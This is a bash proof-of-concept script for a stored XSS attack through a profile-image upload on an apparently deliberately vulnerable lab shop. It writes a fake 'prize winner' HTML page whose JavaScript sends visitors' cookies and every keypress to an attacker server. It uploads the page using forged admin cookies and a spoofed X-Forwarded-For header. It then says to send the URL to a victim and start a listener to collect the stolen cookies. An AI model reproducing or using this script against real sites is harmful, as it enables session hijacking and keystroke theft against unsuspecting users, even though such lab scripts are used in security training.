#!/bin/bash
# HTML File Upload XSS PoC
# Target: VULN SHOP Profile Upload

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"
ATTACKER_SERVER="http://10.0.0.101:8888"

echo "[*] HTML File Upload XSS Test"
echo "[*] Target: $TARGET/profile/upload"
echo ""

# Create malicious HTML file
cat > /tmp/malicious.html << EOF
<!DOCTYPE html>
<html>
<head><title>Prize Winner!</title></head>
<body>
<h1>Congratulations! You've won a prize!</h1>
<p>Please wait while we process your reward...</p>
<script>
// Cookie stealing
var img = new Image();
img.src = "$ATTACKER_SERVER/steal?cookie=" + encodeURIComponent(document.cookie);

// Keylogger
document.onkeypress = function(e) {
    new Image().src = "$ATTACKER_SERVER/keylog?key=" + e.key;
};

// Redirect after 3 seconds
setTimeout(function() {
    window.location.href = "$TARGET";
}, 3000);
</script>
</body>
</html>
EOF

echo "[+] Created malicious HTML: /tmp/malicious.html"
echo "[+] Payload includes:"
echo "    - Cookie stealer"
echo "    - Keylogger"
echo "    - Auto-redirect"
echo ""

# Upload HTML file
echo "[+] Uploading HTML file..."
curl -s -X POST -H "X-Forwarded-For: $MY_IP" \
  -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  -F "profile_image=@/tmp/malicious.html" \
  "$TARGET/profile/upload" | grep -oP 'src="/uploads/[^"]*"'

echo ""

# Verify Content-Type
echo "[+] Verifying Content-Type..."
curl -s -I -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/malicious.html" | grep "Content-Type"

echo ""
echo "[*] Attack URL: $TARGET/uploads/malicious.html"
echo "[*] Send this URL to victim to steal their cookies!"
echo ""
echo "[*] To receive stolen cookies, start a listener:"
echo "    python3 -m http.server 8888"
